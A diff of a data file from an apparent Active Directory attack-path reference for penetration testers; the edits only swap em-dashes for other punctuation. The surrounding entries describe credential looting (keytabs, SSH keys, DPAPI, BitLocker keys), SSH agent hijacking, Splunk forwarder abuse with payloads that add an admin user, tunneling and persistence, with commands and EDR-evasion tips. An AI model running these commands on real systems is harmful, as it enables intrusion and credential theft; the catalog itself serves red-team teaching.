@@ -569,7 +569,7 @@ hashcat -m 5500 netntlmv1.txt`,
     phase: 'priv-esc',
     summary: "Coerce a host to authenticate and reflect its own NTLM back to its DCE/RPC for local SYSTEM.",
     description:
-      "CVE-2025-33073: a flaw in the NTLM/SMB stack lets a coerced machine's authentication be reflected to a DCE/RPC service on the SAME host, granting SYSTEM. By tricking the target (a crafted SPN / marshalled-name plus PetitPotam-style coercion) into authenticating to an attacker relay that bounces it back to the host's own RPC endpoint, an unprivileged domain user reaches local SYSTEM — no cross-host relay needed. Patched in 2025; SMB signing fully mitigates.",
+      "CVE-2025-33073: a flaw in the NTLM/SMB stack lets a coerced machine's authentication be reflected to a DCE/RPC service on the SAME host, granting SYSTEM. By tricking the target (a crafted SPN / marshalled-name plus PetitPotam-style coercion) into authenticating to an attacker relay that bounces it back to the host's own RPC endpoint, an unprivileged domain user reaches local SYSTEM, with no cross-host relay needed. Patched in 2025; SMB signing fully mitigates.",
     tools: [
       { name: 'NetExec (coerce_plus)', url: 'https://github.com/Pennyw0rth/NetExec' },
       { name: 'Impacket (ntlmrelayx)', url: 'https://github.com/fortra/impacket' },
@@ -586,8 +586,8 @@ hashcat -m 5500 netntlmv1.txt`,
     ],
     mitre: mitre('T1068'),
     references: [
-      { label: 'NVD — CVE-2025-33073', url: 'https://nvd.nist.gov/vuln/detail/CVE-2025-33073' },
-      { label: 'HackTricks — NTLM', url: 'https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html' },
+      { label: 'NVD, CVE-2025-33073', url: 'https://nvd.nist.gov/vuln/detail/CVE-2025-33073' },
+      { label: 'HackTricks, NTLM', url: 'https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html' },
     ],
     requires: ['A coercible target without enforced SMB signing (unpatched, pre-2025)'],
     opsec:
@@ -600,7 +600,7 @@ hashcat -m 5500 netntlmv1.txt`,
     phase: 'credential-access',
     summary: 'Read msFVE-RecoveryInformation from AD to unlock seized, offline or dual-booted volumes.',
     description:
-      "Where BitLocker recovery keys are escrowed to AD, anyone able to read msFVE-RecoveryInformation on computer objects (delegated, or a DA) can recover the 48-digit recovery password and decrypt any offline volume — exposing NTDS.dit on a stolen DC disk, or the SAM and files on a recovered laptop. A pure directory read, like LAPS.",
+      "Where BitLocker recovery keys are escrowed to AD, anyone able to read msFVE-RecoveryInformation on computer objects (delegated, or a DA) can recover the 48-digit recovery password and decrypt any offline volume: exposing NTDS.dit on a stolen DC disk, or the SAM and files on a recovered laptop. A pure directory read, like LAPS.",
     tools: [
       { name: 'NetExec (bitlocker)', url: 'https://github.com/Pennyw0rth/NetExec' },
       { name: 'PowerView / Get-ADObject', url: 'https://github.com/PowerShellMafia/PowerSploit' },
@@ -618,7 +618,7 @@ hashcat -m 5500 netntlmv1.txt`,
     references: [
       { label: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
       {
-        label: 'Microsoft — BitLocker recovery overview',
+        label: 'Microsoft, BitLocker recovery overview',
         url: 'https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/recovery-overview',
       },
     ],
@@ -633,7 +633,7 @@ hashcat -m 5500 netntlmv1.txt`,
     phase: 'credential-access',
     summary: 'Loot Kerberos keytabs, ticket caches & SSSD cache on domain-joined Linux.',
     description:
-      "Domain-joined Linux (SSSD, realmd, Samba, PBIS/Centrify) keeps Kerberos material on disk that Windows-only tooling never sees. /etc/krb5.keytab holds the host's machine-account key (service keytabs hold SPN keys) — extract the NT/AES hash; user credential caches (/tmp/krb5cc_*, $KRB5CCNAME) are live tickets you can reuse directly; and the SSSD cache (/var/lib/sss/db, /var/lib/sss/secrets) can surface cached password hashes. Root on one Linux box thus reaches domain accounts.",
+      "Domain-joined Linux (SSSD, realmd, Samba, PBIS/Centrify) keeps Kerberos material on disk that Windows-only tooling never sees. /etc/krb5.keytab holds the host's machine-account key (service keytabs hold SPN keys), from which you extract the NT/AES hash; user credential caches (/tmp/krb5cc_*, $KRB5CCNAME) are live tickets you can reuse directly; and the SSSD cache (/var/lib/sss/db, /var/lib/sss/secrets) can surface cached password hashes. Root on one Linux box thus reaches domain accounts.",
     tools: [
       { name: 'KeyTabExtract', url: 'https://github.com/sosdave/KeyTabExtract' },
       { name: 'Linikatz', url: 'https://github.com/CiscoCXSecurity/linikatz' },
@@ -650,16 +650,16 @@ python3 keytabextract.py /etc/krb5.keytab`, lang: 'bash' },
     opsec: 'Reading keytab/ccache/SSSD files is quiet local file access (auditd may log reads of /etc/krb5.keytab if configured). Reused ccache tickets look like ordinary Kerberos traffic.',
     difficulty: 'medium',
     references: [
-      { label: 'HackTricks — Harvesting Tickets from Linux', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.html' },
+      { label: 'HackTricks, Harvesting Tickets from Linux', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.html' },
     ],
   },
   {
     id: 'dpapi-machine-secrets',
     label: 'Machine DPAPI Secrets',
     phase: 'credential-access',
-    summary: 'Decrypt SYSTEM-scoped DPAPI — service/task/WiFi creds and machine cert keys.',
+    summary: 'Decrypt SYSTEM-scoped DPAPI: service/task/WiFi creds and machine cert keys.',
     description:
-      "DPAPI's machine scope protects secrets owned by the computer rather than a user, unlocked by the DPAPI_SYSTEM LSA secret you hold as SYSTEM/local admin. Decrypting the machine master keys recovers credentials saved by services and scheduled tasks, WiFi PSKs, and — most usefully — machine certificate private keys (which enable PKINIT / certificate auth as the host). Distinct from the per-user DPAPI layer and the domain backup key.",
+      "DPAPI's machine scope protects secrets owned by the computer rather than a user, unlocked by the DPAPI_SYSTEM LSA secret you hold as SYSTEM/local admin. Decrypting the machine master keys recovers credentials saved by services and scheduled tasks, WiFi PSKs, and, most usefully, machine certificate private keys (which enable PKINIT / certificate auth as the host). Distinct from the per-user DPAPI layer and the domain backup key.",
     tools: [
       { name: 'SharpDPAPI', url: 'https://github.com/GhostPack/SharpDPAPI' },
       { name: 'DonPAPI', url: 'https://github.com/login-securite/DonPAPI' },
@@ -672,10 +672,10 @@ SharpDPAPI.exe machinecredentials`, lang: 'cmd' },
     ],
     requires: ['SYSTEM / local admin on the host (for the DPAPI_SYSTEM key)'],
     mitre: mitre('T1555.004'),
-    opsec: 'Reading machine master keys + LSA secrets touches SYSTEM-protected stores EDR watches, and SharpDPAPI is signatured — but it recovers material LSASS never holds (service creds, cert private keys) without scraping LSASS.',
+    opsec: 'Reading machine master keys + LSA secrets touches SYSTEM-protected stores EDR watches, and SharpDPAPI is signatured; but it recovers material LSASS never holds (service creds, cert private keys) without scraping LSASS.',
     difficulty: 'medium',
     references: [
-      { label: 'HackTricks — DPAPI: Extracting Passwords', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html' },
+      { label: 'HackTricks, DPAPI: Extracting Passwords', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html' },
     ],
   },
   {
@@ -684,7 +684,7 @@ SharpDPAPI.exe machinecredentials`, lang: 'cmd' },
     phase: 'credential-access',
     summary: 'Sweep a Linux host for SSH keys, history, config secrets & in-memory creds.',
     description:
-      "Once you can read a Linux host, sweep for reusable secrets the Kerberos stores miss: SSH private keys (~/.ssh/id_*, and authorized_keys/known_hosts to map pivots), shell history (.bash_history/.zsh_history), config and .env files under /etc, /var/www and /opt, database creds (~/.pgpass, ~/.my.cnf), mounted-share creds (/etc/fstab, cifs credential files), the GNOME keyring / KWallet, and cleartext passwords still in memory (mimipenguin). SSH private keys are the prize — they pivot with no password.",
+      "Once you can read a Linux host, sweep for reusable secrets the Kerberos stores miss: SSH private keys (~/.ssh/id_*, and authorized_keys/known_hosts to map pivots), shell history (.bash_history/.zsh_history), config and .env files under /etc, /var/www and /opt, database creds (~/.pgpass, ~/.my.cnf), mounted-share creds (/etc/fstab, cifs credential files), the GNOME keyring / KWallet, and cleartext passwords still in memory (mimipenguin). SSH private keys are the prize: they pivot with no password.",
     tools: [
       { name: 'LinPEAS (PEASS-ng)', url: 'https://github.com/peass-ng/PEASS-ng' },
       { name: 'LaZagne', url: 'https://github.com/AlessandroZ/LaZagne' },
@@ -702,15 +702,15 @@ cat /etc/fstab ~/.pgpass ~/.my.cnf 2>/dev/null`, lang: 'bash' },
     opsec: 'Mostly quiet file reads; mimipenguin and LinPEAS touch many paths / process memory and are AV-signatured on hardened Linux. Prefer targeted reads on monitored hosts.',
     difficulty: 'easy',
     references: [
-      { label: 'HackTricks — Linux Privilege Escalation', url: 'https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html' },
-      { label: 'PayloadsAllTheThings — Linux Privilege Escalation', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md' },
+      { label: 'HackTricks, Linux Privilege Escalation', url: 'https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html' },
+      { label: 'PayloadsAllTheThings, Linux Privilege Escalation', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md' },
     ],
   },
   {
     id: 'ssh-hijack',
     label: 'SSH Session Hijacking',
     phase: 'lateral-movement',
-    summary: 'Ride a live ControlMaster socket or forwarded ssh-agent — no creds.',
+    summary: 'Ride a live ControlMaster socket or forwarded ssh-agent: no creds needed.',
     description:
       "On a host where a user holds active SSH sessions, pivot as them without their password or key. OpenSSH ControlMaster multiplexing leaves a control socket you can reuse to open new channels over their authenticated connection; and a forwarded ssh-agent (SSH_AUTH_SOCK) lets you sign authentications onward to any host the user can reach. Both inherit the victim's identity silently.",
     tools: [
@@ -724,12 +724,12 @@ ssh-add -l && ssh victim@next-host`, lang: 'bash' },
     ],
     requires: ['root (or the session owner) on a host with an active ControlMaster socket or forwarded ssh-agent'],
     mitre: mitre('T1563.001'),
-    opsec: "No new authentication — you reuse the victim's live session/agent, so there is no password prompt and no key on disk (very quiet). Agent forwarding to untrusted hosts is the root misconfiguration.",
+    opsec: "No new authentication: you reuse the victim's live session/agent, so there is no password prompt and no key on disk (very quiet). Agent forwarding to untrusted hosts is the root misconfiguration.",
     difficulty: 'medium',
     references: [
-      { label: 'HackTricks — Pentesting SSH', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html' },
-      { label: 'Embrace The Red — TTP Diaries: SSH Agent Hijacking', url: 'https://embracethered.com/blog/posts/2022/ttp-diaries-ssh-agent-hijacking/' },
-      { label: 'Graham Helton — Abusing SSH-Agent for Lateral Movement', url: 'https://grahamhelton.com/blog/ssh-agent' },
+      { label: 'HackTricks, Pentesting SSH', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html' },
+      { label: 'Embrace The Red, TTP Diaries: SSH Agent Hijacking', url: 'https://embracethered.com/blog/posts/2022/ttp-diaries-ssh-agent-hijacking/' },
+      { label: 'Graham Helton, Abusing SSH-Agent for Lateral Movement', url: 'https://grahamhelton.com/blog/ssh-agent' },
     ],
   },
   {
@@ -750,11 +750,11 @@ ansible-vault view group_vars/all/vault.yml`, lang: 'bash' },
     ],
     requires: ['Access to a CI/CD or config-management server (Ansible controller, Jenkins, Artifactory/Nexus, GitLab runner)'],
     mitre: mitre('T1552.001'),
-    opsec: 'These servers are high-value yet often under-monitored, and the recovered deploy/service accounts are frequently privileged across many hosts — fast and quiet compared with dumping a DC.',
+    opsec: 'These servers are high-value yet often under-monitored, and the recovered deploy/service accounts are frequently privileged across many hosts: fast and quiet compared with dumping a DC.',
     difficulty: 'medium',
     references: [
-      { label: 'Ansible — Protecting secrets with Vault', url: 'https://docs.ansible.com/ansible/latest/vault_guide/index.html' },
-      { label: 'gquere — pwn_jenkins (Jenkins post-exploitation)', url: 'https://github.com/gquere/pwn_jenkins' },
+      { label: 'Ansible, Protecting secrets with Vault', url: 'https://docs.ansible.com/ansible/latest/vault_guide/index.html' },
+      { label: 'gquere, pwn_jenkins (Jenkins post-exploitation)', url: 'https://github.com/gquere/pwn_jenkins' },
     ],
   },
   {
@@ -763,7 +763,7 @@ ansible-vault view group_vars/all/vault.yml`, lang: 'bash' },
     phase: 'priv-esc',
     summary: 'Escape a constrained PowerShell (JEA) admin endpoint to the RunAs identity.',
     description:
-      "Just Enough Administration (JEA) exposes a constrained PowerShell remoting endpoint that executes as a privileged virtual / RunAs account while restricting the caller to whitelisted functions in NoLanguage mode. Enumerate the visible functions for ones that wrap arbitrary execution (Invoke-Expression, Start-Process, external binaries, or a -ScriptBlock parameter), or escape the constrained runspace, to run commands as the privileged RunAs identity — a local-to-admin jump on that host.",
+      "Just Enough Administration (JEA) exposes a constrained PowerShell remoting endpoint that executes as a privileged virtual / RunAs account while restricting the caller to whitelisted functions in NoLanguage mode. Enumerate the visible functions for ones that wrap arbitrary execution (Invoke-Expression, Start-Process, external binaries, or a -ScriptBlock parameter), or escape the constrained runspace, to run commands as the privileged RunAs identity: a local-to-admin jump on that host.",
     requires: ['Credentials that map to a JEA (constrained PowerShell remoting) endpoint'],
     commands: [
       { label: 'Inspect the endpoint (visible functions + language mode)', code: r`Get-PSSessionConfiguration | Select Name, RunAsUser
@@ -774,10 +774,10 @@ Get-Command -CommandType Function; $ExecutionContext.SessionState.LanguageMode`,
     opsec: 'JEA endpoints enable transcription and module logging by design, so breakout commands stand out against the whitelisted baseline. The usual escape is a visible function that shells out (Invoke-Expression / external binary) rather than a runspace escape.',
     difficulty: 'hard',
     references: [
-      { label: 'Microsoft — Just Enough Administration overview', url: 'https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview' },
-      { label: 'Microsoft — JEA security considerations', url: 'https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/security-considerations' },
-      { label: 'scriptjunkie — Just Too Much Administration: Breaking JEA', url: 'https://scriptjunkie.us/2016/10/just-too-much-administration-breaking-jea-powershells-new-security-barrier/' },
-      { label: 'NewEraSec — JEA breakout notes', url: 'https://infra.newerasec.com/infrastructure-testing/breakout/just-enough-administration-jea' },
+      { label: 'Microsoft, Just Enough Administration overview', url: 'https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview' },
+      { label: 'Microsoft, JEA security considerations', url: 'https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/security-considerations' },
+      { label: 'scriptjunkie, Just Too Much Administration: Breaking JEA', url: 'https://scriptjunkie.us/2016/10/just-too-much-administration-breaking-jea-powershells-new-security-barrier/' },
+      { label: 'NewEraSec, JEA breakout notes', url: 'https://infra.newerasec.com/infrastructure-testing/breakout/just-enough-administration-jea' },
     ],
   },
   {
@@ -786,7 +786,7 @@ Get-Command -CommandType Function; $ExecutionContext.SessionState.LanguageMode`,
     phase: 'lateral-movement',
     summary: 'Push a forwarder bundle → SYSTEM on every Splunk-monitored host.',
     description:
-      "Splunk aggregates logs from a Universal Forwarder agent installed across the estate. With access to the Splunk deployment server (admin, or via forwarders that do not verify the server's TLS certificate — a MITM), push a malicious app bundle whose scripted input executes as the forwarder service account — SYSTEM on Windows by default — on every managed endpoint at once. SplunkWhisperer2 also turns a single forwarder with a writable input config into local RCE / privesc. An estate-wide foothold in the same class as SCCM and WSUS deployment abuse.",
+      "Splunk aggregates logs from a Universal Forwarder agent installed across the estate. With access to the Splunk deployment server (admin, or via forwarders that do not verify the server's TLS certificate, a MITM), push a malicious app bundle whose scripted input executes as the forwarder service account (SYSTEM on Windows by default) on every managed endpoint at once. SplunkWhisperer2 also turns a single forwarder with a writable input config into local RCE / privesc. An estate-wide foothold in the same class as SCCM and WSUS deployment abuse.",
     tools: [
       { name: 'SplunkWhisperer2', url: 'https://github.com/cnotin/SplunkWhisperer2' },
     ],
@@ -794,13 +794,13 @@ Get-Command -CommandType Function; $ExecutionContext.SessionState.LanguageMode`,
       { label: 'Remote: deploy a bundle via the deployment server', code: r`python3 PySplunkWhisperer2_remote.py --host 10.0.0.40 --lhost 10.0.0.66 --username admin --password 'Password1' --payload 'net user pwn P@ss123! /add'`, lang: 'bash' },
       { label: 'Local: abuse a writable forwarder input config', code: r`python3 PySplunkWhisperer2_local.py --payload 'cmd /c net localgroup administrators pwn /add'`, lang: 'bash' },
     ],
-    requires: ['Access to the Splunk deployment server (admin creds, or forwarders that skip server-cert verification) — or a forwarder with a writable input config'],
+    requires: ['Access to the Splunk deployment server (admin creds, or forwarders that skip server-cert verification), or a forwarder with a writable input config'],
     mitre: mitre('T1072'),
-    opsec: "Pushing an app to forwarders is loud in Splunk's own logs and lands on many hosts at once — target selectively. The scripted input spawns from splunkd as SYSTEM, which EDR flags.",
+    opsec: "Pushing an app to forwarders is loud in Splunk's own logs and lands on many hosts at once; target selectively. The scripted input spawns from splunkd as SYSTEM, which EDR flags.",
     difficulty: 'medium',
     references: [
-      { label: 'Eapolsniper — Abusing Splunk Forwarders for RCE & Persistence', url: 'https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/' },
-      { label: 'HackTricks — Pentesting Splunk (8089)', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/8089-splunkd.html' },
+      { label: 'Eapolsniper, Abusing Splunk Forwarders for RCE & Persistence', url: 'https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/' },
+      { label: 'HackTricks, Pentesting Splunk (8089)', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/8089-splunkd.html' },
     ],
   },
   {
@@ -809,7 +809,7 @@ Get-Command -CommandType Function; $ExecutionContext.SessionState.LanguageMode`,
     phase: 'lateral-movement',
     summary: 'Run commands fleet-wide via Ansible/Salt or an RMM suite.',
     description:
-      "Configuration-management and remote-management platforms exist to run code on every node they manage — turn one you control into estate-wide execution. From an Ansible controller, fire ad-hoc commands or a play against the whole inventory (as root via become); a Salt master commands its minions over the event bus; Puppet/Chef ship a malicious manifest/recipe. RMM and endpoint suites (PDQ Deploy, Tanium, ManageEngine, NinjaOne, Intune) deploy a package or script to all enrolled devices as SYSTEM. One controller = code execution everywhere, plus its stored deploy credentials.",
+      "Configuration-management and remote-management platforms exist to run code on every node they manage, so turning one you control into estate-wide execution is the goal. From an Ansible controller, fire ad-hoc commands or a play against the whole inventory (as root via become); a Salt master commands its minions over the event bus; Puppet/Chef ship a malicious manifest/recipe. RMM and endpoint suites (PDQ Deploy, Tanium, ManageEngine, NinjaOne, Intune) deploy a package or script to all enrolled devices as SYSTEM. One controller = code execution everywhere, plus its stored deploy credentials.",
     tools: [
       { name: 'Ansible', url: 'https://www.ansible.com/' },
       { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
@@ -820,10 +820,10 @@ Get-Command -CommandType Function; $ExecutionContext.SessionState.LanguageMode`,
     ],
     requires: ['Control of a config-management controller or RMM console (Ansible/Salt/Puppet, PDQ/Tanium/ManageEngine/Intune)'],
     mitre: mitre('T1072'),
-    opsec: "Mass deployment is loud in the platform's own job / audit logs and lands on many hosts at once — target a subset. Commands spawn from the agent (as SYSTEM/root), a strong EDR signal.",
+    opsec: "Mass deployment is loud in the platform's own job / audit logs and lands on many hosts at once; target a subset. Commands spawn from the agent (as SYSTEM/root), a strong EDR signal.",
     difficulty: 'medium',
     references: [
-      { label: 'Ansible — Introduction to ad-hoc commands', url: 'https://docs.ansible.com/ansible/latest/command_guide/intro_adhoc.html' },
+      { label: 'Ansible, Introduction to ad-hoc commands', url: 'https://docs.ansible.com/ansible/latest/command_guide/intro_adhoc.html' },
     ],
   },
   {
@@ -832,7 +832,7 @@ Get-Command -CommandType Function; $ExecutionContext.SessionState.LanguageMode`,
     phase: 'lateral-movement',
     summary: 'Tunnel through a foothold to reach segmented internal networks.',
     description:
-      "A compromised host is often routable to subnets you can't reach directly. Turn it into a pivot: a SOCKS proxy driven through proxychains, SSH local / remote / dynamic port-forwards, or a userland tunnel (Ligolo-ng, Chisel, sshuttle, Metasploit autoroute) to reach internal DCs, management VLANs, and services. Pivoting grants no privilege — it grants REACH, opening the rest of the estate to enumeration and remote execution.",
+      "A compromised host is often routable to subnets you can't reach directly. Turn it into a pivot: a SOCKS proxy driven through proxychains, SSH local / remote / dynamic port-forwards, or a userland tunnel (Ligolo-ng, Chisel, sshuttle, Metasploit autoroute) to reach internal DCs, management VLANs, and services. Pivoting grants no privilege; it grants REACH, opening the rest of the estate to enumeration and remote execution.",
     tools: [
       { name: 'Ligolo-ng', url: 'https://github.com/nicocha30/ligolo-ng' },
       { name: 'Chisel', url: 'https://github.com/jpillora/chisel' },
@@ -851,20 +851,20 @@ chisel client 10.0.0.66:8080 R:socks`, lang: 'bash' },
     opsec: 'Long-lived tunnels and unusual outbound connections from a server are detectable; userland tools (Ligolo-ng / Chisel) avoid dropping kernel drivers. Scope tunnels tightly and tear them down.',
     difficulty: 'medium',
     references: [
-      { label: 'HackTricks — Tunneling & Port Forwarding', url: 'https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html' },
-      { label: 'PayloadsAllTheThings — Network Pivoting Techniques', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md' },
+      { label: 'HackTricks, Tunneling & Port Forwarding', url: 'https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html' },
+      { label: 'PayloadsAllTheThings, Network Pivoting Techniques', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md' },
     ],
   },
   {
     id: 'internal-web-apps',
     label: 'Internal Web App Attacks',
     phase: 'initial-access',
-    summary: 'Foothold via an exposed internal app — Jenkins, GitLab, Tomcat, Splunk…',
+    summary: 'Foothold via an exposed internal app: Jenkins, GitLab, Tomcat, Splunk…',
     description:
-      "Internal networks are full of unhardened web apps that hand you a foothold or credentials with no domain account: CI/CD and dev tooling (Jenkins Groovy console → RCE, GitLab, Gitea, SonarQube), app servers (Tomcat / JBoss manager → deploy a WAR), monitoring / IT suites (Splunk, PRTG, Zabbix, osTicket), and CMSes (WordPress, Joomla, Drupal). Hunt default credentials, known CVEs, and admin consoles that allow code execution — these footholds frequently run as a service account or SYSTEM.",
+      "Internal networks are full of unhardened web apps that hand you a foothold or credentials with no domain account: CI/CD and dev tooling (Jenkins Groovy console → RCE, GitLab, Gitea, SonarQube), app servers (Tomcat / JBoss manager → deploy a WAR), monitoring / IT suites (Splunk, PRTG, Zabbix, osTicket), and CMSes (WordPress, Joomla, Drupal). Hunt default credentials, known CVEs, and admin consoles that allow code execution; these footholds frequently run as a service account or SYSTEM.",
     tools: [
       { name: 'Nuclei', url: 'https://github.com/projectdiscovery/nuclei' },
-      { name: 'gquere — pwn_jenkins', url: 'https://github.com/gquere/pwn_jenkins' },
+      { name: 'gquere, pwn_jenkins', url: 'https://github.com/gquere/pwn_jenkins' },
       { name: 'Metasploit', url: 'https://github.com/rapid7/metasploit-framework' },
     ],
     commands: [
@@ -877,15 +877,15 @@ nuclei -l web_hosts.txt -severity critical,high`, lang: 'bash' },
     opsec: 'Credential brute-forcing and exploit traffic against internal apps are noisy; prefer default-credential checks and a single known-good exploit. App-server shells stand out as child processes of the web service.',
     difficulty: 'medium',
     references: [
-      { label: 'HackTricks — Pentesting Web', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html' },
-      { label: 'gquere — pwn_jenkins', url: 'https://github.com/gquere/pwn_jenkins' },
+      { label: 'HackTricks, Pentesting Web', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html' },
+      { label: 'gquere, pwn_jenkins', url: 'https://github.com/gquere/pwn_jenkins' },
     ],
   },
   {
     id: 'weak-services',
     label: 'Weak / Legacy Services',
     phase: 'initial-access',
-    summary: 'Loot legacy protocols — FTP, Telnet, NFS, SNMP, rsync, VNC.',
+    summary: 'Loot legacy protocols: FTP, Telnet, NFS, SNMP, rsync, VNC.',
     description:
       "Legacy and misconfigured services leak data, credentials, or a foothold with no domain account: anonymous or default-credential FTP / TFTP (config files, backups), cleartext Telnet / rlogin, NFS exports that are world-readable or set no_root_squash (read secrets, or write a SUID-root binary), SNMP public / private community strings (device configs and creds), rsync modules, and open VNC. Map them during recon and take the low-hanging fruit before touching AD.",
     tools: [
@@ -904,18 +904,18 @@ snmpwalk -v2c -c public 10.0.0.10`, lang: 'bash' },
     opsec: 'Mostly low-noise reads; NFS mounts and SNMP sweeps are visible to network monitoring. High signal-to-effort against flat or legacy network segments.',
     difficulty: 'easy',
     references: [
-      { label: 'HackTricks — Pentesting NFS', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html' },
-      { label: 'HackTricks — Pentesting SNMP', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html' },
-      { label: 'HackTricks — Pentesting FTP', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/index.html' },
+      { label: 'HackTricks, Pentesting NFS', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html' },
+      { label: 'HackTricks, Pentesting SNMP', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html' },
+      { label: 'HackTricks, Pentesting FTP', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/index.html' },
     ],
   },
   {
     id: 'host-persistence',
     label: 'Host Persistence',
     phase: 'persistence',
-    summary: 'Survive reboot on a foothold — run keys, tasks, services, WMI subs.',
+    summary: 'Survive reboot on a foothold: run keys, tasks, services, WMI subs.',
     description:
-      "Keep access to a compromised host independent of the domain: registry Run / RunOnce keys, a scheduled task, a new or hijacked Windows service, a WMI permanent event subscription (fires on a trigger, often as SYSTEM), COM hijacking, or a startup-folder shortcut. These host-local footholds survive reboot and password resets and are cheap to plant — pair them with domain persistence (golden ticket, AdminSDHolder, …) for layered resilience.",
+      "Keep access to a compromised host independent of the domain: registry Run / RunOnce keys, a scheduled task, a new or hijacked Windows service, a WMI permanent event subscription (fires on a trigger, often as SYSTEM), COM hijacking, or a startup-folder shortcut. These host-local footholds survive reboot and password resets and are cheap to plant; pair them with domain persistence (golden ticket, AdminSDHolder, …) for layered resilience.",
     tools: [
       { name: 'SharPersist', url: 'https://github.com/mandiant/SharPersist' },
       { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
@@ -931,8 +931,8 @@ sc start Updater`, lang: 'cmd' },
     opsec: 'Autoruns, services (7045) and scheduled tasks (4698) are classic, well-monitored persistence; WMI event subscriptions and COM hijacks are quieter and fileless but Sysmon / EDR increasingly catch them. Blend names with legitimate software.',
     difficulty: 'easy',
     references: [
-      { label: 'PayloadsAllTheThings — Windows Persistence', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md' },
-      { label: 'persistence-info.github.io — Windows persistence catalog', url: 'https://persistence-info.github.io/' },
+      { label: 'PayloadsAllTheThings, Windows Persistence', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md' },
+      { label: 'persistence-info.github.io, Windows persistence catalog', url: 'https://persistence-info.github.io/' },
     ],
   },
 ];
@@ -965,7 +965,7 @@ export const adCoverageEdges: AttackEdge[] = [
   { source: 'coerced-auth', target: 'webclient-coercion', label: 'over HTTP' },
   { source: 'webclient-coercion', target: 'ntlm-relay' },
   { source: 'webclient-coercion', target: 'adcs-esc8', label: 'relay to web enroll' },
-  // (webclient-coercion -> rbcd removed: redundant rank-skip —
+  // (webclient-coercion -> rbcd removed: redundant rank-skip:
   //  webclient-coercion -> ntlm-relay -> relay-to-ldap -> rbcd already covers it.)
 
   // Delegation additions
@@ -998,7 +998,7 @@ export const adCoverageEdges: AttackEdge[] = [
   { source: 'acl-genericall', target: 'targeted-asrep' },
   { source: 'targeted-asrep', target: 'crack-hash-offline', label: 'AS-REP hash' },
   { source: 'ad-cat-mssql', target: 'mssql-exec' },
-  // xp_cmdshell runs as the SQL Server SERVICE account, not SYSTEM — usually a
+  // xp_cmdshell runs as the SQL Server SERVICE account, not SYSTEM: usually a
   // virtual/managed account (with SeImpersonate → potato → SYSTEM) or a domain
   // service account, sometimes LocalSystem. Land as that account, then escalate.
   { source: 'mssql-exec', target: 'user-foothold', label: 'as the SQL service account' },
@@ -1033,18 +1033,18 @@ export const adCoverageEdges: AttackEdge[] = [
   { source: 'devops-secrets', target: 'valid-domain-creds', label: 'deploy/admin creds' },
   { source: 'find-privesc-path', target: 'jea-breakout' },
   { source: 'jea-breakout', target: 'local-admin-host', label: 'breakout → shell', rel: 'host-exec' },
-  // Deployment Platform Abuse umbrella — Splunk + config-mgmt/RMM (SCCM & WSUS live in their own branches)
+  // Deployment Platform Abuse umbrella: Splunk + config-mgmt/RMM (SCCM & WSUS live in their own branches)
   { source: 'ad-cat-deploy-abuse', target: 'splunk-abuse' },
   { source: 'splunk-abuse', target: 'local-admin-host', label: 'SYSTEM on forwarders', rel: 'host-exec' },
   { source: 'ad-cat-deploy-abuse', target: 'config-mgmt-abuse' },
   { source: 'config-mgmt-abuse', target: 'local-admin-host', label: 'exec on managed hosts', rel: 'host-exec' },
-  // Pivoting & tunneling — reach segmented internal networks from a foothold
+  // Pivoting & tunneling: reach segmented internal networks from a foothold
   { source: 'ad-cat-lateral', target: 'pivoting-tunneling' },
   { source: 'pivoting-tunneling', target: 'lateral-movement-cme', label: 'reach internal hosts' },
   // No-cred recon footholds: internal web apps + weak / legacy services
   { source: 'network-recon', target: 'internal-web-apps' },
